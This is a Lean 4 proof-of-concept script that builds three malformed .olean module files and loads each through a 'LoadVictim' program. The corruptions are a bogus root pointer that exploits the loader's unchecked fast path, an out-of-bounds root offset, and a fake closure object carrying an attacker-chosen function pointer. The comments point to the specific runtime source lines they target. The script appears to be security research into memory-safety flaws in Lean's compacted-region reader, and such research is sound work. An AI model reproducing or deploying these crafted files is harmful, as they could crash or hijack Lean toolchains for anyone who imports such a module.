import Lean

open Lean

def readU64LE (bs : ByteArray) (off : Nat) : UInt64 :=
  (bs.get! off).toUInt64 |||
  ((bs.get! (off + 1)).toUInt64 <<< 8) |||
  ((bs.get! (off + 2)).toUInt64 <<< 16) |||
  ((bs.get! (off + 3)).toUInt64 <<< 24) |||
  ((bs.get! (off + 4)).toUInt64 <<< 32) |||
  ((bs.get! (off + 5)).toUInt64 <<< 40) |||
  ((bs.get! (off + 6)).toUInt64 <<< 48) |||
  ((bs.get! (off + 7)).toUInt64 <<< 56)

def writeU64LE (bs : ByteArray) (off : Nat) (val : UInt64) : ByteArray := Id.run do
  let mut out := bs
  for i in [0:8] do
    let b : UInt8 := ((val >>> (i * 8).toUInt64) &&& 0xff).toUInt8
    out := out.set! (off + i) b
  return out

def toHex (v : UInt64) : String :=
  let digits := Nat.toDigits 16 v.toNat
  "0x" ++ String.ofList digits

def main : IO Unit := do
  let validBytes ← IO.FS.readBinFile "ValidMod.olean"
  let marker := String.fromUTF8! (validBytes.extract 0 5)
  let version := validBytes.get! 5
  let flags := validBytes.get! 6
  let leanVer := String.fromUTF8! (ByteArray.mk ((validBytes.extract 7 40).toList.takeWhile (· != 0)).toArray)
  let githash := String.fromUTF8! (validBytes.extract 40 80)
  let baseAddr := readU64LE validBytes 80
  let rootPtr := readU64LE validBytes 88
  let rootOff := (rootPtr - baseAddr).toNat
  let rootTag := validBytes.get! (rootOff + 7)
  let rootOther := validBytes.get! (rootOff + 6)
  IO.println s!"=== ValidMod.olean Header (88 bytes) ==="
  IO.println s!"  size       : {validBytes.size} bytes"
  IO.println s!"  marker     : {marker}"
  IO.println s!"  version    : {version}"
  IO.println s!"  flags      : {flags}"
  IO.println s!"  lean_ver   : {leanVer}"
  IO.println s!"  githash    : {githash}"
  IO.println s!"  base_addr  : {toHex baseAddr}"
  IO.println s!"  root_ptr   : {toHex rootPtr} (file offset {rootOff})"
  IO.println s!"  root_tag   : {rootTag} (m_other/num_objs = {rootOther})"

  -- 1. FastPathBogusRoot.olean:
  -- Keep base_addr unchanged so mmap at base_addr succeeds (`m_begin == m_base_addr`),
  -- triggering the fast path in `region_reader::read()` (`src/runtime/compact.cpp:643-657`)
  -- which skips the object graph walk entirely! Set root_ptr at offset 88 to 0xdeadbeef00000000.
  let fastBogus := writeU64LE validBytes 88 0xdeadbeef00000000
  IO.FS.writeBinFile "FastPathBogusRoot.olean" fastBogus

  -- 2. SlowPathOOBOffset.olean:
  -- Change base_addr in header (offset 80) to 0x400000000000 + 1 (unaligned to page size so
  -- mmap cannot map at `m_base_addr`, forcing `m_begin != m_base_addr` slow path in `compact.cpp:659`),
  -- and set root_ptr at offset 88 to an out-of-bounds offset (`base_addr + 0x10000000`).
  let fakeBase : UInt64 := 0x400000000001
  let slowOOB := writeU64LE (writeU64LE validBytes 80 fakeBase) 88 (fakeBase + 0x10000000)
  IO.FS.writeBinFile "SlowPathOOBOffset.olean" slowOOB

  -- 3. FastPathClosureRoot.olean:
  -- Keep base_addr unchanged (fast path), and overwrite the root object at `rootOff`
  -- with a `LeanClosure` tag (`245`) and bogus `m_fun` pointer `0x4141414141414140`.
  let mut closureRoot := validBytes.set! (rootOff + 7) 245 -- LeanClosure
  closureRoot := writeU64LE closureRoot (rootOff + 8) 0x4141414141414140
  IO.FS.writeBinFile "FastPathClosureRoot.olean" closureRoot

  for modName in ["ValidMod", "FastPathBogusRoot", "SlowPathOOBOffset", "FastPathClosureRoot"] do
    IO.println s!"\n=== Testing {modName}.olean via LoadVictim (trustLevel := 0, loadExts := false) ==="
    let out ← IO.Process.output {
      cmd := "sh"
      args := #["-c", s!"lean --run LoadVictim.lean {modName}"]
    }
    IO.println s!"  exitCode : {out.exitCode}"
    IO.println s!"  stdout   : {out.stdout.trimAscii}"
    IO.println s!"  stderr   : {out.stderr.trimAscii}"
